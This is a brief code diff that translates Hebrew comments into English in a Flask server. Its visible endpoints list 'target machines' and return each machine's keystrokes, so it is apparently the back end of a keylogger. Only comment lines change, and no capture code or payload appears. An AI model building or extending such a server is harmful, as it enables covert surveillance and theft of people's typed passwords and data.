@@ -7,7 +7,7 @@ app = Flask(__name__)
 DATA_FOLDER = "data"
 os.makedirs(DATA_FOLDER, exist_ok=True)
 
-# הגדרת הלוגים
+# Setting up the logs
 logging.basicConfig(
     level=logging.INFO,
     format="%(asctime)s [%(levelname)s] %(message)s",
@@ -42,7 +42,7 @@ def upload():
     logging.info("new file save in machin '%s': %s", machine, file_path)
 
     return jsonify({"status": "success", "file": file_path}), 200
-#קבלת לוגים בחזרה
+#Receive logs back
 
 @app.route('/api/get_target_machines_list/', methods=['GET'])
 def get_target_machines_list():
@@ -76,7 +76,7 @@ def get_target_machines_list():
             })
 
     return jsonify(machines), 200
-#קבלת מידע לפי מחשבים
+#Getting information from computers
 
 
 @app.route('/api/get_keystrokes/<machine>', methods=['GET'])
